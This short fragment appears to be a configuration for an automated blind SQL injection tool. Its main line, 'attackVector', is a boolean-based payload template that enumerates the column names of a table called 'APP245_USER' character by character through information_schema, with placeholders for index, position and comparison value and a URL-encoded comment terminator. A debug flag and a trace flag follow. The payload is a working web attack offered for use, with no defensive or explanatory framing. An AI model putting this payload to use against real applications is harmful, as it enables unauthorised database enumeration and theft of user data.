...
attackVector = 'ascii(substring((select column_name from information_schema.COLUMNS where table_schema = database() and table_name = \'APP245_USER\' limit _tbl-index_,1),_pos_,1)) <= _check_%23'
debug = 0
trace = 0
